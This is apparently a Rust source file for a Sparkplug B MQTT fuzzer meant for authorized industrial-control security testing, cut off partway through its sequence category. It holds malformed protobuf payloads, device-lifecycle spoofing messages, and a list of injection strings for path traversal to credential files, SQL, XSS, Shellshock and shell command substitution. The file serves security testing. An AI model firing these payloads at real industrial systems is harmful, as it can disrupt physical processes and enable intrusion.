//! Sparkplug B protocol fuzzer for authorized ICS/OT security assessments.
//!
//! Inspired by sparkplug-fuzzer by timzaak
//! (<https://github.com/timzaak/sparkplug-fuzzer>). Safety-first design:
//! - Mandatory responsible-use banner with typed YES confirmation
//! - Passive-only discovery phase before any active fuzzing
//! - Enforced minimum 50 ms delay between every published message
//! - All fuzz messages use `QoS` 0 and `retain=false` (least disruptive)
//! - Targeted spoofing requires a separate opt-in flag and second confirmation

use crate::vendors::mqtt::session::{MqttSession, MqttMessage};
use anyhow::Result;
use std::io::{self, Write};
use std::thread;
use std::time::{Duration, Instant};

// ─── Safety config ────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct FuzzConfig {
    /// Milliseconds between each published message. Clamped to ≥ 50 in code.
    pub delay_ms: u64,
    /// Seconds to passively listen for Sparkplug traffic before fuzzing.
    /// Clamped to ≥ 5 in code.
    pub discovery_secs: u32,
    /// Whether to run targeted spoofing (NDEATH/NBIRTH) against discovered devices.
    /// Requires a second typed confirmation at runtime.
    pub probe_write: bool,
    /// Fuzz categories to run.
    pub categories: Vec<FuzzCategory>,
    /// If true, print what would be sent without actually publishing.
    pub dry_run: bool,
}

impl Default for FuzzConfig {
    fn default() -> Self {
        Self {
            delay_ms: 100,
            discovery_secs: 10,
            probe_write: false,
            categories: vec![FuzzCategory::Topic, FuzzCategory::Malformed, FuzzCategory::Boundary],
            dry_run: false,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FuzzCategory {
    Topic,
    Malformed,
    Boundary,
    Ordering,
    Sequence,
}

impl FuzzCategory {
    pub fn parse(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "topic" => Some(Self::Topic),
            "malformed" => Some(Self::Malformed),
            "boundary" => Some(Self::Boundary),
            "ordering" => Some(Self::Ordering),
            "sequence" => Some(Self::Sequence),
            _ => None,
        }
    }

    fn name(self) -> &'static str {
        match self {
            Self::Topic => "topic",
            Self::Malformed => "malformed",
            Self::Boundary => "boundary",
            Self::Ordering => "ordering",
            Self::Sequence => "sequence",
        }
    }

    fn risk_label(self) -> &'static str {
        match self {
            Self::Topic    => "LOW    -- malformed topics, brokers typically reject or ignore",
            Self::Sequence => "LOW    -- sequence edge cases on fuzzer namespace only",
            Self::Boundary => "MEDIUM -- valid protobuf, extreme values, may trip subscriber ingestion",
            Self::Malformed => "MEDIUM -- corrupt protobufs on a valid Sparkplug topic",
            Self::Ordering => "MEDIUM -- lifecycle violations (NDEATH/NBIRTH) visible to all spBv1.0/# subscribers",
        }
    }
}

// ─── Discovered devices ───────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct SparkplugDevice {
    pub group: String,
    pub node: String,
    pub device: Option<String>,
}

// ─── Manual protobuf encoding ─────────────────────────────────────────────────

// Sparkplug B uses Protocol Buffers 3.x. We encode the fields we need
// by hand to avoid a dependency on prost/protobuf.
//
// Field tag = (field_number << 3) | wire_type
// Wire types: 0 = varint, 1 = 64-bit, 2 = length-delimited, 5 = 32-bit

fn encode_varint(mut n: u64) -> Vec<u8> {
    let mut buf = Vec::with_capacity(10);
    loop {
        let byte = (n & 0x7F) as u8;
        n >>= 7;
        if n == 0 {
            buf.push(byte);
            break;
        }
        buf.push(byte | 0x80);
    }
    buf
}

fn field_varint(field_number: u32, value: u64) -> Vec<u8> {
    let tag = field_number << 3; // wire type 0
    let mut out = encode_varint(u64::from(tag));
    out.extend(encode_varint(value));
    out
}

fn field_bytes(field_number: u32, data: &[u8]) -> Vec<u8> {
    let tag = (field_number << 3) | 2; // wire type 2 (length-delimited)
    let mut out = encode_varint(u64::from(tag));
    out.extend(encode_varint(data.len() as u64));
    out.extend_from_slice(data);
    out
}

fn field_str(field_number: u32, s: &str) -> Vec<u8> {
    field_bytes(field_number, s.as_bytes())
}

// Build a minimal Sparkplug B Metric message (nested, then wrapped with field_bytes).
//
// Metric proto fields (eclipse/tahu SparkplugB.proto):
//   1 = name (string)
//   2 = alias (uint64)
//   3 = timestamp (uint64)
//   4 = datatype (uint32)
//   5 = is_historical (bool)
//   6 = is_transient (bool)
//   7 = is_null (bool)
//   8 = metadata (MetaData, length-delimited)
//  10 = int_value (uint32, oneof value)
//  11 = long_value (uint64, oneof value)
//  14 = boolean_value (bool, oneof value)
//  15 = string_value (string, oneof value)
fn build_metric_int(name: &str, datatype: u32, value: u32) -> Vec<u8> {
    let ts = unix_ms();
    let mut m = Vec::new();
    m.extend(field_str(1, name));
    m.extend(field_varint(3, ts));
    m.extend(field_varint(4, u64::from(datatype)));
    m.extend(field_varint(10, u64::from(value)));
    m
}

fn build_metric_long(name: &str, datatype: u32, value: u64) -> Vec<u8> {
    let ts = unix_ms();
    let mut m = Vec::new();
    m.extend(field_str(1, name));
    m.extend(field_varint(3, ts));
    m.extend(field_varint(4, u64::from(datatype)));
    m.extend(field_varint(11, value));
    m
}

fn build_metric_bool(name: &str, value: bool) -> Vec<u8> {
    let ts = unix_ms();
    let mut m = Vec::new();
    m.extend(field_str(1, name));
    m.extend(field_varint(3, ts));
    m.extend(field_varint(4, 11)); // datatype 11 = Boolean
    m.extend(field_varint(14, u64::from(value)));
    m
}

fn build_metric_string(name: &str, value: &str) -> Vec<u8> {
    let ts = unix_ms();
    let mut m = Vec::new();
    m.extend(field_str(1, name));
    m.extend(field_varint(3, ts));
    m.extend(field_varint(4, 12)); // datatype 12 = String
    m.extend(field_str(15, value));
    m
}

// Payload proto fields: 1=timestamp, 2=metrics (repeated), 3=seq
fn build_payload(seq: u64, metrics: &[Vec<u8>]) -> Vec<u8> {
    let ts = unix_ms();
    let mut p = Vec::new();
    p.extend(field_varint(1, ts));
    for metric in metrics {
        p.extend(field_bytes(2, metric));
    }
    p.extend(field_varint(3, seq));
    p
}

fn nbirth_payload(seq: u64) -> Vec<u8> {
    // Sparkplug B spec §2.2.3.2: NBIRTH MUST include a bdSeq metric (UInt64, datatype 8).
    // We use bdSeq=0 as a stub — no LWT is configured so consistency cannot be guaranteed.
    let bdseq_metric = build_metric_long("bdSeq", 8, 0);
    let rebirth_metric = build_metric_bool("Node Control/Rebirth", false);
    build_payload(seq, &[bdseq_metric, rebirth_metric])
}

fn ndeath_payload(bdseq: u64) -> Vec<u8> {
    // bdSeq is a UInt64 (datatype 8)
    let metric = build_metric_long("bdSeq", 8, bdseq);
    build_payload(0, &[metric])
}

fn ddata_int_payload(seq: u64, name: &str, datatype: u32, value: u32) -> Vec<u8> {
    let metric = build_metric_int(name, datatype, value);
    build_payload(seq, &[metric])
}

fn ddata_string_payload(seq: u64, name: &str, value: &str) -> Vec<u8> {
    let metric = build_metric_string(name, value);
    build_payload(seq, &[metric])
}

fn unix_ms() -> u64 {
    u64::try_from(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis(),
    )
    .unwrap_or(u64::MAX)
}

// ─── Sparkplug topic helpers ──────────────────────────────────────────────────

const FUZZ_GROUP: &str = "SCADAver_Fuzz";
const FUZZ_NODE: &str = "FuzzNode";
const FUZZ_DEVICE: &str = "FuzzDevice";

fn sp_topic(group: &str, msg_type: &str, node: &str, device: Option<&str>) -> String {
    match device {
        Some(d) => format!("spBv1.0/{group}/{msg_type}/{node}/{d}"),
        None => format!("spBv1.0/{group}/{msg_type}/{node}"),
    }
}

// ─── Responsible-use banner ───────────────────────────────────────────────────

fn print_banner_and_confirm(host: &str, port: u16) -> bool {
    println!();
    println!("  \u{2554}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2557}");
    println!("  \u{2551}  SPARKPLUG B FUZZER \u{2014} AUTHORIZED USE ONLY                  \u{2551}");
    println!("  \u{2551}                                                          \u{2551}");
    println!("  \u{2551}  This tool sends malformed and protocol-violating MQTT   \u{2551}");
    println!("  \u{2551}  messages. In ICS/OT environments unexpected payloads    \u{2551}");
    println!("  \u{2551}  can disrupt physical processes. Treat every target as   \u{2551}");
    println!("  \u{2551}  production-adjacent unless proven otherwise.            \u{2551}");
    println!("  \u{2551}                                                          \u{2551}");
    println!("  \u{2551}  Only run against systems you own or have explicit       \u{2551}");
    println!("  \u{2551}  written authorization to test.                          \u{2551}");
    println!("  \u{255a}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{2550}\u{255d}");
    println!();
    println!("  Target: {host}:{port}");
    println!();
    println!("  [!] LWT: This session has no Last Will configured. If the connection");
    println!("      drops unexpectedly, FuzzNode will remain alive in broker state.");
    println!("      Press Ctrl+C carefully -- NDEATH will not be sent on crash.");
    println!();
    print!("  Type YES to proceed: ");
    let _ = io::stdout().flush();
    let mut input = String::new();
    if io::stdin().read_line(&mut input).is_err() {
        return false;
    }
    input.trim() == "YES"
}

fn confirm_targeted(count: usize) -> bool {
    println!();
    println!("  [!] Targeted fuzzing will spoof NDEATH/NBIRTH for {count} discovered device(s).");
    println!("      This disrupts Sparkplug applications and can trigger physical responses");
    println!("      on field devices. Proceed only if explicitly authorized.");
    println!();
    print!("  Type YES to continue: ");
    let _ = io::stdout().flush();
    let mut input = String::new();
    if io::stdin().read_line(&mut input).is_err() {
        return false;
    }
    input.trim() == "YES"
}

// ─── Safe publish ─────────────────────────────────────────────────────────────

fn safe_publish(
    session: &mut MqttSession,
    topic: &str,
    payload: &[u8],
    delay_ms: u64,
    desc: &str,
    dry_run: bool,
) -> bool {
    if dry_run {
        println!("  [DRY] {desc}");
        return true;
    }
    match session.publish(topic, payload, 0, false) {
        Ok(()) => {
            println!("  [TX] {desc}");
            thread::sleep(Duration::from_millis(delay_ms));
            true
        }
        Err(e) => {
            println!("  [!] publish failed ({desc}): {e:#}");
            false
        }
    }
}

// ─── Passive discovery ────────────────────────────────────────────────────────

fn passive_discovery(session: &MqttSession, secs: u32) -> (Vec<SparkplugDevice>, bool) {
    let _ = session; // subscribe is on &mut, but drain_messages is &self
    println!("  [*] Discovery: listening for {secs}s on spBv1.0/# ...");

    let deadline = Instant::now() + Duration::from_secs(u64::from(secs));
    let mut devices: Vec<SparkplugDevice> = Vec::new();
    let mut any_rx = false;

    while Instant::now() < deadline {
        for msg in session.drain_messages() {
            any_rx = true;
            process_discovery_message(&msg, &mut devices);
        }
        thread::sleep(Duration::from_millis(250));
    }

    let node_count = devices.iter().filter(|d| d.device.is_none()).count();
    let device_count = devices.iter().filter(|d| d.device.is_some()).count();
    println!("  [*] Discovery complete: {node_count} node(s), {device_count} device(s) found.");
    (devices, any_rx)
}

fn process_discovery_message(msg: &MqttMessage, devices: &mut Vec<SparkplugDevice>) {
    // Topic format: spBv1.0/{group}/{msg_type}/{node}[/{device}]
    let parts: Vec<&str> = msg.topic.splitn(6, '/').collect();
    if parts.len() < 4 || parts[0] != "spBv1.0" {
        return;
    }
    let group = parts[1];
    let msg_type = parts[2];
    let node = parts[3];
    let device = parts.get(4).copied();

    match msg_type {
        "NBIRTH" => {
            println!("  [+] NBIRTH  {}", msg.topic);
            let key = SparkplugDevice { group: group.into(), node: node.into(), device: None };
            if !devices.iter().any(|d| d.group == key.group && d.node == key.node && d.device.is_none()) {
                devices.push(key);
            }
        }
        "DBIRTH" => {
            println!("  [+] DBIRTH  {}", msg.topic);
            if let Some(dev) = device {
                let key = SparkplugDevice {
                    group: group.into(),
                    node: node.into(),
                    device: Some(dev.into()),
                };
                if !devices.iter().any(|d| d.device.as_deref() == Some(dev) && d.node == node) {
                    devices.push(key);
                }
            }
        }
        _ => {}
    }
}

// ─── Protocol establishment ───────────────────────────────────────────────────

// Publish NBIRTH + DBIRTH for the fuzzer's own node/device before running any
// fuzz category that sends DDATA. Without this, wildcard subscribers receive
// DDATA for an unknown node, which is a Sparkplug protocol violation and can
// crash poorly-implemented historians or raise false alarms in SCADA systems.
fn fuzz_establish(session: &mut MqttSession, delay_ms: u64, dry_run: bool) {
    println!("  [*] Establish: publishing NBIRTH + DBIRTH for {FUZZ_GROUP}/{FUZZ_NODE}");
    let nbirth_topic = sp_topic(FUZZ_GROUP, "NBIRTH", FUZZ_NODE, None);
    let dbirth_topic = sp_topic(FUZZ_GROUP, "DBIRTH", FUZZ_NODE, Some(FUZZ_DEVICE));
    let nbirth = nbirth_payload(0);
    let dbirth_metric = build_metric_bool("Device/Online", true);
    let dbirth = build_payload(1, &[dbirth_metric]);
    if !safe_publish(session, &nbirth_topic, &nbirth, delay_ms,
        &format!("establish  NBIRTH {FUZZ_GROUP}/{FUZZ_NODE}"), dry_run) {
        println!("  [!] establish: NBIRTH failed; subsequent DDATA categories have no birth context");
    }
    if !safe_publish(session, &dbirth_topic, &dbirth, delay_ms,
        &format!("establish  DBIRTH {FUZZ_GROUP}/{FUZZ_NODE}/{FUZZ_DEVICE}"), dry_run) {
        println!("  [!] establish: DBIRTH failed; DDATA from device categories has no birth context");
    }
}

// ─── Fuzz categories ──────────────────────────────────────────────────────────

fn fuzz_topic(session: &mut MqttSession, delay_ms: u64, dry_run: bool) -> usize {
    println!("  [*] Category: topic");

    // Build cases dynamically so all topics use FUZZ_GROUP/FUZZ_NODE constants,
    // making fuzzer traffic identifiable in broker logs and subscriber traces.
    let long_node = "A".repeat(100);
    let long_group = "A".repeat(75);
    let cases: Vec<(String, &[u8])> = vec![
        // Case variations (wrong case on protocol prefix)
        (format!("SPBV1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("spbv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("SpBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        // Wrong versions
        (format!("spAv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv2.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.1/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv0.9/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        // Missing segments
        (format!("spBv1.0/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/{FUZZ_NODE}"), b""),
        ("spBv1.0/".to_string(), b""),
        ("spBv1.0".to_string(), b""),
        // Extra slashes
        (format!("spBv1.0//{FUZZ_GROUP}/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}//NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA//{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}/"), b""),
        // Special chars in group segment
        (format!("spBv1.0/{FUZZ_GROUP} Extra/NDATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}+Extra/NDATA/{FUZZ_NODE}"), b""),
        // Special chars in node segment
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE} X"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}\tX"), b""),
        // Unknown message types
        (format!("spBv1.0/{FUZZ_GROUP}/NINFO/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/BIRTH/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/DATA/{FUZZ_NODE}"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/CMD/{FUZZ_NODE}"), b""),
        // Very long segments
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{long_node}"), b""),
        (format!("spBv1.0/{long_group}/NDATA/{FUZZ_NODE}"), b""),
        // Encoding tricks
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}%2FFake"), b""),
        (format!("spBv1.0/{FUZZ_GROUP}/NDATA/{FUZZ_NODE}/../../../"), b""),
        // STATE topic (different format — no spBv1.0 prefix).
        // online:false can trigger host-offline failover logic in SCADA consumers.
        ("STATE/FuzzHost".to_string(), b"{\"timestamp\":0,\"online\":false}"),
        ("STATE/".to_string(), b""),
        ("STATE".to_string(), b""),
        // Edge: $ system topic
        ("$".to_string(), b""),
    ];

    let mut count = 0;
    for (topic, payload) in &cases {
        let desc = format!("topic  {topic}");
        if safe_publish(session, topic, payload, delay_ms, &desc, dry_run) {
            count += 1;
        }
    }
    println!("  [*] topic: {count} messages sent");
    count
}

fn fuzz_malformed(
    session: &mut MqttSession,
    delay_ms: u64,
    dry_run: bool,
) -> usize {
    println!("  [*] Category: malformed");
    let topic = sp_topic(FUZZ_GROUP, "DDATA", FUZZ_NODE, Some(FUZZ_DEVICE));

    // Build a valid NBIRTH to use as a base for bit-flip corruption
    let valid_birth = nbirth_payload(0);
    let mut bit_flipped = valid_birth.clone();
    if !bit_flipped.is_empty() {
        bit_flipped[0] ^= 0xFF;
    }

    // Truncated valid birth
    let truncated = if valid_birth.len() > 4 { valid_birth[..valid_birth.len() / 2].to_vec() } else { vec![0x08] };

    let static_cases: &[(&[u8], &str)] = &[
        (b"",     "empty payload"),
        (b"\x00", "single null byte"),
        (b"\xff", "single 0xFF byte"),
        // Truncated varint: field 1 (timestamp), value starts but is cut off
        (b"\x08\x80", "truncated varint"),
        // Overlong varint (10 continuation bytes — invalid)
        (b"\x08\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01", "overlong varint"),
        // Field 2 (metrics) with wire-type 0 instead of 2 (wrong wire type)
        (b"\x10\x00", "wrong wire type for metrics field"),
        // Field with unknown high field number
        (b"\xf8\xff\xff\x0f\x00", "unknown high field number"),
        // Looks like a valid payload header then garbage
        (b"\x08\x80\x80\x80\x80\x01\xff\xfe\xfd", "valid header then garbage"),
        // All zeros
        (&[0u8; 64], "all-zero 64 bytes"),
        // All 0xFF
        (&[0xFFu8; 64], "all-0xFF 64 bytes"),
        // Repeated field tag with no content
        (b"\x12\x00\x12\x00\x12\x00\x12\x00", "empty repeated metrics"),
    ];

    let mut count = 0;

    for (payload, desc) in static_cases {
        let full_desc = format!("malformed  {desc}");
        if safe_publish(session, &topic, payload, delay_ms, &full_desc, dry_run) {
            count += 1;
        }
    }

    // Bit-flip of a valid payload
    if safe_publish(session, &topic, &bit_flipped, delay_ms, "malformed  bit-flipped NBIRTH", dry_run) {
        count += 1;
    }
    // Truncated valid payload
    if safe_publish(session, &topic, &truncated, delay_ms, "malformed  truncated NBIRTH", dry_run) {
        count += 1;
    }

    // Random-length payloads using deterministic pseudo-random bytes
    // (same each run for reproducibility — no Date::now/random unavailable)
    let pseudo_random_16: [u8; 16] = [
        0x4d, 0x7a, 0x13, 0x99, 0xbe, 0x02, 0xf5, 0xc1,
        0x88, 0x3e, 0x6f, 0xd4, 0xa0, 0x1b, 0x57, 0xe9,
    ];
    let pseudo_random_64: Vec<u8> = (0u8..64).map(|i| i.wrapping_mul(37).wrapping_add(0x5a)).collect();
    let pseudo_random_256: Vec<u8> = (0u8..=255).map(|i| i.wrapping_mul(131).wrapping_add(0x7f)).collect();

    for (payload, desc) in [
        (pseudo_random_16.as_ref(), "pseudo-random 16 bytes"),
        (pseudo_random_64.as_slice(), "pseudo-random 64 bytes"),
        (pseudo_random_256.as_slice(), "pseudo-random 256 bytes"),
    ] {
        let full_desc = format!("malformed  {desc}");
        if safe_publish(session, &topic, payload, delay_ms, &full_desc, dry_run) {
            count += 1;
        }
    }

    println!("  [*] malformed: {count} messages sent");
    count
}

fn fuzz_boundary(session: &mut MqttSession, delay_ms: u64, dry_run: bool) -> usize {
    println!("  [*] Category: boundary");
    let topic = sp_topic(FUZZ_GROUP, "DDATA", FUZZ_NODE, Some(FUZZ_DEVICE));
    let mut count = 0;
    let mut seq: u64 = 0;

    // Numeric boundary cases: (name, datatype, value_as_u32)
    // Datatypes: 1=Int8, 2=Int16, 3=Int32, 5=UInt8, 6=UInt16, 7=UInt32
    let int_cases: &[(&str, u32, u32, &str)] = &[
        ("fuzz/Int8/zero",       1, 0,             "Int8 = 0"),
        ("fuzz/Int8/min",        1, 0xFFFF_FF80,   "Int8 = -128 (as u32)"),
        ("fuzz/Int8/max",        1, 127,            "Int8 = 127"),
        ("fuzz/Int8/overflow",   1, 128,            "Int8 = 128 (overflow)"),
        ("fuzz/Int8/underflow",  1, 0xFFFF_FF7F,   "Int8 = -129 (underflow)"),
        ("fuzz/Int8/u8max",      1, 255,            "Int8 = 255"),
        ("fuzz/Int16/zero",      2, 0,             "Int16 = 0"),
        ("fuzz/Int16/min",       2, 0xFFFF_8000,   "Int16 = -32768"),
        ("fuzz/Int16/max",       2, 32767,          "Int16 = 32767"),
        ("fuzz/Int16/overflow",  2, 32768,          "Int16 = 32768 (overflow)"),
        ("fuzz/Int32/zero",      3, 0,             "Int32 = 0"),
        ("fuzz/Int32/min",       3, 0x8000_0000,   "Int32 = -2^31"),
        ("fuzz/Int32/max",       3, 0x7FFF_FFFF,   "Int32 = 2^31-1"),
        ("fuzz/Int32/overflow",  3, 0x8000_0001,   "Int32 = 2^31+1 (overflow)"),
        ("fuzz/UInt8/zero",      5, 0,             "UInt8 = 0"),
        ("fuzz/UInt8/max",       5, 255,            "UInt8 = 255"),
        ("fuzz/UInt8/overflow",  5, 256,            "UInt8 = 256 (overflow)"),
        ("fuzz/UInt8/neg",       5, 0xFFFF_FFFF,   "UInt8 = -1 as u32"),
        ("fuzz/UInt16/zero",     6, 0,             "UInt16 = 0"),
        ("fuzz/UInt16/max",      6, 65535,          "UInt16 = 65535"),
        ("fuzz/UInt16/overflow", 6, 65536,          "UInt16 = 65536 (overflow)"),
        ("fuzz/UInt32/zero",     7, 0,             "UInt32 = 0"),
        ("fuzz/UInt32/max",      7, 0xFFFF_FFFF,   "UInt32 = 4294967295"),
    ];

    for (name, datatype, value, desc) in int_cases {
        let payload = ddata_int_payload(seq, name, *datatype, *value);
        if safe_publish(session, &topic, &payload, delay_ms, &format!("boundary  {desc}"), dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // UInt64 boundary cases (need field_varint(11, ...) = long_value)
    let long_topic = sp_topic(FUZZ_GROUP, "DDATA", FUZZ_NODE, Some(FUZZ_DEVICE));
    let long_cases: &[(&str, u64, &str)] = &[
        ("fuzz/UInt64/zero",    0,                "UInt64 = 0"),
        ("fuzz/UInt64/max32",   4_294_967_295,    "UInt64 = 2^32-1"),
        ("fuzz/UInt64/max32+1", 4_294_967_296,    "UInt64 = 2^32"),
        ("fuzz/UInt64/max63",   9_223_372_036_854_775_807, "UInt64 = 2^63-1"),
        ("fuzz/UInt64/max64",   u64::MAX,         "UInt64 = 2^64-1"),
    ];
    for (name, value, desc) in long_cases {
        let metric = build_metric_long(name, 8, *value); // datatype 8 = UInt64
        let payload = build_payload(seq, &[metric]);
        if safe_publish(session, &long_topic, &payload, delay_ms, &format!("boundary  {desc}"), dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // String injection payloads (datatype 12 = String)
    let string_cases: &[&str] = &[
        "",
        "A",
        &"A".repeat(256),
        "\x00",
        "hello\x00world",
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n",
        "${7*7}",
        "{{7*7}}",
        "#{7*7}",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'; DROP TABLE metrics; --",
        "\" OR 1=1 --",
        "\r\nX-Injected: header",
        "() { :; }; /bin/bash -c 'echo vulnerable'",
        "`touch /tmp/pwned`",
        "$(touch /tmp/pwned)",
        "|ls",
        "&& ls",
        "\t\n\r",
        "\x1b[31mRED\x1b[0m",
    ];

    for s in string_cases {
        let end = s.char_indices().nth(40).map_or(s.len(), |(i, _)| i);
        let desc_s = if s.len() > end { format!("\"{}...\"", &s[..end]) } else { format!("\"{s}\"") };
        let payload = ddata_string_payload(seq, "fuzz/String/injection", s);
        if safe_publish(session, &topic, &payload, delay_ms, &format!("boundary  string {desc_s}"), dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // is_null flag with non-null value (protobuf field 8 = is_null, bool)
    {
        let mut metric = build_metric_int("fuzz/is_null_with_value", 3, 42);
        metric.extend(field_varint(7, 1)); // is_null = true (field 7) but value is set
        let payload = build_payload(seq, &[metric]);
        if safe_publish(session, &topic, &payload, delay_ms, "boundary  is_null=true but value set", dry_run) {
            count += 1;
        }
    }

    println!("  [*] boundary: {count} messages sent");
    count
}

fn fuzz_ordering(session: &mut MqttSession, delay_ms: u64, dry_run: bool) -> usize {
    println!("  [*] Category: ordering  (uses fuzzer's own group/node only)");
    let mut count = 0;
    let mut seq: u64 = 0;

    // Reset: fuzz_establish() already published NBIRTH. Send NDEATH first so
    // Case 1 (DDATA before NBIRTH) genuinely tests the "node offline" state.
    {
        let reset_topic = sp_topic(FUZZ_GROUP, "NDEATH", FUZZ_NODE, None);
        let reset_payload = ndeath_payload(0);
        let reset_ok = safe_publish(session, &reset_topic, &reset_payload, delay_ms,
            "ordering  NDEATH (reset state before ordering tests)", dry_run);
        if !reset_ok {
            println!("  [!] ordering: reset NDEATH failed; Case 1 may not reflect intended state");
        }
    }

    // Case 1: DDATA before NBIRTH (protocol ordering violation)
    {
        let topic = sp_topic(FUZZ_GROUP, "DDATA", FUZZ_NODE, Some(FUZZ_DEVICE));
        let payload = ddata_int_payload(seq, "fuzz/ordering/premature_data", 3, 1);
        if safe_publish(session, &topic, &payload, delay_ms, "ordering  DDATA before NBIRTH", dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // Now send NBIRTH (establish presence)
    {
        let topic = sp_topic(FUZZ_GROUP, "NBIRTH", FUZZ_NODE, None);
        let payload = nbirth_payload(seq);
        if safe_publish(session, &topic, &payload, delay_ms, "ordering  NBIRTH", dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // Case 2: Double NBIRTH without NDEATH
    {
        let topic = sp_topic(FUZZ_GROUP, "NBIRTH", FUZZ_NODE, None);
        let payload = nbirth_payload(seq);
        if safe_publish(session, &topic, &payload, delay_ms, "ordering  double NBIRTH (no NDEATH)", dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // Case 3: NDEATH then DDATA (data after death)
    {
        let death_topic = sp_topic(FUZZ_GROUP, "NDEATH", FUZZ_NODE, None);
        let death_payload = ndeath_payload(1);
        if safe_publish(session, &death_topic, &death_payload, delay_ms, "ordering  NDEATH", dry_run) {
            count += 1;
        }
        let data_topic = sp_topic(FUZZ_GROUP, "DDATA", FUZZ_NODE, Some(FUZZ_DEVICE));
        let data_payload = ddata_int_payload(seq, "fuzz/ordering/data_after_death", 3, 99);
        if safe_publish(session, &data_topic, &data_payload, delay_ms, "ordering  DDATA after NDEATH", dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // Case 4: DBIRTH without preceding NBIRTH (orphan device birth)
    {
        let topic = sp_topic(FUZZ_GROUP, "DBIRTH", FUZZ_NODE, Some(FUZZ_DEVICE));
        let metric = build_metric_bool("Node Control/Rebirth", false);
        let payload = build_payload(seq, &[metric]);
        if safe_publish(session, &topic, &payload, delay_ms, "ordering  DBIRTH without prior NBIRTH", dry_run) {
            count += 1;
            seq += 1;
        }
    }

    // Case 5: Rapid lifecycle churn (NBIRTH → NDEATH → NBIRTH in quick succession)
    for i in 0..3u8 {
        let birth_topic = sp_topic(FUZZ_GROUP, "NBIRTH", FUZZ_NODE, None);
        let birth_payload = nbirth_payload(seq);
        if safe_publish(session, &birth_topic, &birth_payload, delay_ms,
            &format!("ordering  lifecycle churn NBIRTH #{i}"), dry_run) {
            count += 1;
            seq += 1;
        }
        let death_topic = sp_topic(FUZZ_GROUP, "NDEATH", FUZZ_NODE, None);
        let death_payload = ndeath_payload(u64::from(i));
        if safe_publish(session, &death_topic, &death_payload, delay_ms,
            &format!("ordering  lifecycle churn NDEATH #{i}"), dry_run) {
            count += 1;
        }
    }

    println!("  [*] ordering: {count} messages sent");
    count
}

fn fuzz_sequence(session: &mut MqttSession, delay_ms: u64, dry_run: bool) -> usize {
    println!("  [*] Category: sequence");
    let topic = sp_topic(FUZZ_GROUP, "NDATA", FUZZ_NODE, None);
    let mut count = 0;

    // Send NDEATH first in case fuzz_establish already published NBIRTH and Ordering
    // didn't run (Ordering would have left FuzzNode dead). Without this, the NBIRTH
    // below is a double-NBIRTH-without-NDEATH, an unintentional protocol violation.
    {
        let ndeath_topic = sp_topic(FUZZ_GROUP, "NDEATH", FUZZ_NODE, None);
        safe_publish(session, &ndeath_topic, &ndeath_payload(0), delay_ms,
            "sequence  NDEATH (reset before preamble)", dry_run);
    }
